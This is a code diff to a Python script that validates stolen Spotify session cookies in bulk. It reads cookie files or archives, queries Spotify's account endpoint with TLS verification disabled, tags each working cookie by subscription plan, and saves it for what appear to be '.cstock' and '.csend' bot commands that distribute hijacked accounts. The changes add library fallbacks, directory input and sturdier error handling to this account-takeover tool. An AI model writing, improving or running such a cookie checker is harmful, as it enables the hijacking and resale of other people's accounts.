@@ -2,13 +2,29 @@
 
 import os
 import sys
-import json
 import time
-import json
-import orjson  # For faster JSON parsing
 import zipfile
 import asyncio
-import aiohttp  # For async HTTP requests
+import json
+
+# Try to import faster JSON parsing library if available
+try:
+    import orjson
+    USING_ORJSON = True
+    def parse_json(content):
+        return orjson.loads(content)
+except ImportError:
+    USING_ORJSON = False
+    def parse_json(content):
+        return json.loads(content)
+
+# Try to import async http library, fallback to requests if not available
+try:
+    import aiohttp
+    USING_AIOHTTP = True
+except ImportError:
+    USING_AIOHTTP = False
+    import requests
 import argparse
 import traceback
 import threading
@@ -242,48 +258,81 @@ async def check_cookie_async(cookie_content, filename, session):
             'Connection': 'close'  # Optimize for faster connection closure
         }
         
-        # Use aiohttp for async request
-        try:
-            async with session.get(
-                "https://www.spotify.com/eg-ar/api/account/v1/datalayer",
-                headers=headers,
-                cookies=cookies_dict,
-                timeout=aiohttp.ClientTimeout(total=READ_TIMEOUT, connect=CONNECTION_TIMEOUT),
-                ssl=False  # Skip SSL verification for speed
-            ) as response:
-                if response.status == 200:
-                    try:
-                        # Parse JSON with orjson for speed
-                        data = await response.json(content_type=None)
-                        
-                        plan = plan_name_mapping(data.get("currentPlan", "unknown"))
-                        
-                        message = f"✔ Login successful: {filename} ({plan})"
-                        
-                        # Format and save cookie
-                        formatted_cookie, plan = format_cookie_file(data, remove_unwanted_content(cookie_content))
-                        
-                        # Make plan name filesystem safe
-                        plan_safe = plan.replace(" ", "_").lower()
-                        
-                        # Return tuple of data for batch processing
-                        return {
-                            'status': 'success',
-                            'filename': filename,
-                            'plan': plan,
-                            'plan_safe': plan_safe,
-                            'formatted_cookie': formatted_cookie,
-                            'message': message,
-                            'data': data
-                        }, message
-                    except Exception as json_err:
-                        return None, f"⚠ Invalid JSON response for {filename}: {str(json_err)[:50]}"
-                else:
-                    return None, f"✘ Login failed: {filename} (Status: {response.status})"
-        except asyncio.TimeoutError:
-            return None, f"⚠ Request timeout for {filename}"
-        except Exception as req_err:
-            return None, f"⚠ Request error for {filename}: {str(req_err)[:50]}"
+        url = "https://www.spotify.com/eg-ar/api/account/v1/datalayer"
+        
+        if USING_AIOHTTP:
+            # Use aiohttp for async request when available
+            try:
+                async with session.get(
+                    url,
+                    headers=headers,
+                    cookies=cookies_dict,
+                    timeout=aiohttp.ClientTimeout(total=READ_TIMEOUT, connect=CONNECTION_TIMEOUT),
+                    ssl=False  # Skip SSL verification for speed
+                ) as response:
+                    status_code = response.status
+                    if status_code == 200:
+                        try:
+                            # Parse JSON using our custom function
+                            text = await response.text()
+                            data = parse_json(text)
+                        except Exception as json_err:
+                            return None, f"⚠ Invalid JSON response for {filename}: {str(json_err)[:50]}"
+                    else:
+                        return None, f"✘ Login failed: {filename} (Status: {status_code})"
+            except asyncio.TimeoutError:
+                return None, f"⚠ Request timeout for {filename}"
+            except Exception as req_err:
+                return None, f"⚠ Request error for {filename}: {str(req_err)[:50]}"
+        else:
+            # Fallback to requests when aiohttp is not available
+            # We'll run it in a thread pool to avoid blocking
+            def make_request():
+                try:
+                    response = requests.get(
+                        url, 
+                        headers=headers, 
+                        cookies=cookies_dict, 
+                        timeout=(CONNECTION_TIMEOUT, READ_TIMEOUT),
+                        verify=False
+                    )
+                    return response.status_code, response.text
+                except requests.Timeout:
+                    return 408, None  # Timeout status code
+                except Exception as e:
+                    return 500, str(e)  # Internal error
+
+            # Run the synchronous request in a thread pool
+            status_code, text = await asyncio.get_event_loop().run_in_executor(None, make_request)
+            
+            if status_code != 200:
+                return None, f"✘ Login failed: {filename} (Status: {status_code})"
+            
+            try:
+                data = parse_json(text)
+            except Exception as json_err:
+                return None, f"⚠ Invalid JSON response for {filename}: {str(json_err)[:50]}"
+        
+        # Process results
+        plan = plan_name_mapping(data.get("currentPlan", "unknown"))
+        message = f"✔ Login successful: {filename} ({plan})"
+        
+        # Format and save cookie
+        formatted_cookie, plan = format_cookie_file(data, remove_unwanted_content(cookie_content))
+        
+        # Make plan name filesystem safe
+        plan_safe = plan.replace(" ", "_").lower()
+        
+        # Return tuple of data for batch processing
+        return {
+            'status': 'success',
+            'filename': filename,
+            'plan': plan,
+            'plan_safe': plan_safe,
+            'formatted_cookie': formatted_cookie,
+            'message': message,
+            'data': data
+        }, message
 
     except Exception as e:
         error_msg = f"⚠ Error checking {filename}: {e}"
@@ -295,10 +344,23 @@ async def process_batch_async(batch_files, semaphore, progress_callback=None):
     valid_cookies = []
     errors = []
     
-    # Create a ClientSession for all requests in this batch
-    conn = aiohttp.TCPConnector(limit=MAX_CONCURRENT_REQUESTS, ssl=False)
-    async with aiohttp.ClientSession(connector=conn) as session:
-        # Process files in parallel with controlled concurrency
+    # Create session with conditional aiohttp usage
+    session = None
+    
+    # First try block - create session
+    try:
+        # Create aiohttp session if available
+        if USING_AIOHTTP:
+            # Create a ClientSession for all requests in this batch
+            conn = aiohttp.TCPConnector(limit=MAX_CONCURRENT_REQUESTS, ssl=False)
+            session = aiohttp.ClientSession(connector=conn)
+    except Exception as e:
+        debug_print(f"Error creating session: {e}")
+        errors.append(f"⚠ Session creation error: {str(e)}")
+        local_results['errors'] += 1
+    
+    # Second try block - process files
+    try:
         tasks = []
         for file_path, file_name in batch_files:
             # Extract cookies without debug prints for speed
@@ -359,47 +421,66 @@ async def process_batch_async(batch_files, semaphore, progress_callback=None):
             except Exception as e:
                 errors.append(f"⚠ Task error: {str(e)}")
                 local_results['errors'] += 1
-    
-    # Save valid cookies in batch to reduce I/O overhead
-    for file_path, result in valid_cookies:
-        try:
-            # Extract data from result
-            filename = result['filename']
-            plan = result['plan']
-            plan_safe = result['plan_safe']
-            formatted_cookie = result['formatted_cookie']
-            
-            # Create plan folder if needed
-            plan_folder = os.path.join(WORKING_COOKIES_DIR, plan_safe)
-            os.makedirs(plan_folder, exist_ok=True)
-            
-            # Extract just the filename without path and remove any directory paths
-            base_filename = os.path.basename(filename)
-            # Create unique filename by stripping and making safe for filesystem
-            safe_filename = re.sub(r'[\\/*?:"<>|]', '_', base_filename)
-            
-            # Save in working_cookies by plan
-            working_file_path = os.path.join(plan_folder, f"{safe_filename}.txt")
-            
-            # Also save in spotify folder for .cstock and .csend commands
-            cookie_file_path = os.path.join(SPOTIFY_DIR, f"{plan}_{safe_filename}.txt")
-            
-            # Write to both locations
-            with open(working_file_path, 'w', encoding='utf-8') as out_f:
-                out_f.write(formatted_cookie)
-                
-            with open(cookie_file_path, 'w', encoding='utf-8') as out_f:
-                out_f.write(formatted_cookie)
-        except Exception as save_err:
-            debug_print(f"Error saving cookie: {save_err}")
+    except Exception as e:
+        debug_print(f"Error processing batch: {e}")
+        errors.append(f"⚠ Batch processing error: {str(e)}")
+        local_results['errors'] += 1
+        
+    # Third try block - save valid cookies
+    try:
+        # Save valid cookies in batch to reduce I/O overhead
+        for file_path, result in valid_cookies:
             try:
-                # Use the filename if it's defined, otherwise a default message
-                cookie_id = filename if 'filename' in locals() else "unknown"
-                errors.append(f"⚠ Error saving cookie {cookie_id}: {str(save_err)}")
-            except:
-                # Ultimate fallback if something goes wrong with the error handling itself
-                errors.append(f"⚠ Error saving cookie: {str(save_err)}")
-            local_results['errors'] += 1
+                # Extract data from result
+                filename = result['filename']
+                plan = result['plan']
+                plan_safe = result['plan_safe']
+                formatted_cookie = result['formatted_cookie']
+                
+                # Create plan folder if needed
+                plan_folder = os.path.join(WORKING_COOKIES_DIR, plan_safe)
+                os.makedirs(plan_folder, exist_ok=True)
+                
+                # Extract just the filename without path and remove any directory paths
+                base_filename = os.path.basename(filename)
+                # Create unique filename by stripping and making safe for filesystem
+                safe_filename = re.sub(r'[\\/*?:"<>|]', '_', base_filename)
+                
+                # Save in working_cookies by plan
+                working_file_path = os.path.join(plan_folder, f"{safe_filename}.txt")
+                
+                # Also save in spotify folder for .cstock and .csend commands
+                cookie_file_path = os.path.join(SPOTIFY_DIR, f"{plan}_{safe_filename}.txt")
+                
+                # Write to both locations
+                with open(working_file_path, 'w', encoding='utf-8') as out_f:
+                    out_f.write(formatted_cookie)
+                    
+                with open(cookie_file_path, 'w', encoding='utf-8') as out_f:
+                    out_f.write(formatted_cookie)
+            except Exception as save_err:
+                debug_print(f"Error saving cookie: {save_err}")
+                try:
+                    # Reference result data which contains the filename
+                    cookie_id = result.get('filename', "unknown") if isinstance(result, dict) else "unknown"
+                    errors.append(f"⚠ Error saving cookie {cookie_id}: {str(save_err)}")
+                except:
+                    # Ultimate fallback if something goes wrong with the error handling itself
+                    errors.append(f"⚠ Error saving cookie: {str(save_err)}")
+                local_results['errors'] += 1
+    except Exception as e:
+        debug_print(f"Error saving cookies: {e}")
+        errors.append(f"⚠ Error saving cookies: {str(e)}")
+        local_results['errors'] += 1
+    
+    finally:
+        # Clean up resources
+        if session and USING_AIOHTTP:
+            try:
+                await session.close()
+                debug_print("Closed aiohttp session")
+            except Exception as e:
+                debug_print(f"Error closing session: {e}")
     
     # Return batch results
     return {
@@ -501,50 +582,67 @@ async def check_cookies_async(input_file, thread_count=MAX_THREADS):
         results[key] = 0
     
     try:
-        # Save the file to cookies directory
-        temp_file_path = os.path.join(COOKIES_DIR, os.path.basename(input_file))
-        debug_print(f"Temp file path: {temp_file_path}")
-        os.makedirs(os.path.dirname(temp_file_path), exist_ok=True)
-        
-        debug_print("Copying input file to cookies directory")
-        with open(input_file, 'rb') as src, open(temp_file_path, 'wb') as dst:
-            dst.write(src.read())
-        
-        debug_print(f"File copied successfully, size: {os.path.getsize(temp_file_path)} bytes")
-        
-        # Determine if we should process as archive or text file
-        file_ext = os.path.splitext(temp_file_path)[1].lower()
         cookie_files = []
         
-        if file_ext in ['.zip', '.rar']:
-            # For archives, extract and find all cookie files
-            debug_print("Archive detected, using advanced extraction")
+        # Check if input is a directory
+        if os.path.isdir(input_file):
+            debug_print(f"Processing directory: {input_file}")
             
-            # Extract archive
-            extract_dir = os.path.join(COOKIES_DIR, f"extracted_{os.path.basename(temp_file_path)}")
-            os.makedirs(extract_dir, exist_ok=True)
+            # Find all .txt files in the directory
+            for root, _, files in os.walk(input_file):
+                for file in files:
+                    if file.endswith('.txt'):
+                        file_path = os.path.join(root, file)
+                        file_name = os.path.relpath(file_path, input_file)
+                        cookie_files.append((file_path, file_name))
             
-            if extract_from_archive(temp_file_path, extract_dir):
-                debug_print("Archive extraction successful")
-                
-                # Find all cookie files in extracted directory
-                for root, _, files in os.walk(extract_dir):
-                    for file in files:
-                        if file.endswith('.txt'):
-                            file_path = os.path.join(root, file)
-                            file_name = os.path.relpath(file_path, extract_dir)
-                            cookie_files.append((file_path, file_name))
-                
-                debug_print(f"Found {len(cookie_files)} cookie files in archive")
-                results['archives_processed'] += 1
-            else:
-                error_msg = "Failed to extract archive"
-                debug_print(error_msg)
-                return create_error_summary(error_msg)
+            debug_print(f"Found {len(cookie_files)} cookie files in directory")
+            
+        # Process as a single file
         else:
-            # Single file processing
-            debug_print("Processing single file")
-            cookie_files = [(temp_file_path, os.path.basename(temp_file_path))]
+            # Save the file to cookies directory
+            temp_file_path = os.path.join(COOKIES_DIR, os.path.basename(input_file))
+            debug_print(f"Temp file path: {temp_file_path}")
+            os.makedirs(os.path.dirname(temp_file_path), exist_ok=True)
+            
+            debug_print("Copying input file to cookies directory")
+            with open(input_file, 'rb') as src, open(temp_file_path, 'wb') as dst:
+                dst.write(src.read())
+            
+            debug_print(f"File copied successfully, size: {os.path.getsize(temp_file_path)} bytes")
+            
+            # Determine if we should process as archive or text file
+            file_ext = os.path.splitext(temp_file_path)[1].lower()
+            
+            if file_ext in ['.zip', '.rar']:
+                # For archives, extract and find all cookie files
+                debug_print("Archive detected, using advanced extraction")
+                
+                # Extract archive
+                extract_dir = os.path.join(COOKIES_DIR, f"extracted_{os.path.basename(temp_file_path)}")
+                os.makedirs(extract_dir, exist_ok=True)
+                
+                if extract_from_archive(temp_file_path, extract_dir):
+                    debug_print("Archive extraction successful")
+                    
+                    # Find all cookie files in extracted directory
+                    for root, _, files in os.walk(extract_dir):
+                        for file in files:
+                            if file.endswith('.txt'):
+                                file_path = os.path.join(root, file)
+                                file_name = os.path.relpath(file_path, extract_dir)
+                                cookie_files.append((file_path, file_name))
+                    
+                    debug_print(f"Found {len(cookie_files)} cookie files in archive")
+                    results['archives_processed'] += 1
+                else:
+                    error_msg = "Failed to extract archive"
+                    debug_print(error_msg)
+                    return create_error_summary(error_msg)
+            else:
+                # Single file processing
+                debug_print("Processing single file")
+                cookie_files = [(temp_file_path, os.path.basename(temp_file_path))]
         
         if not cookie_files:
             debug_print("No cookie files found")
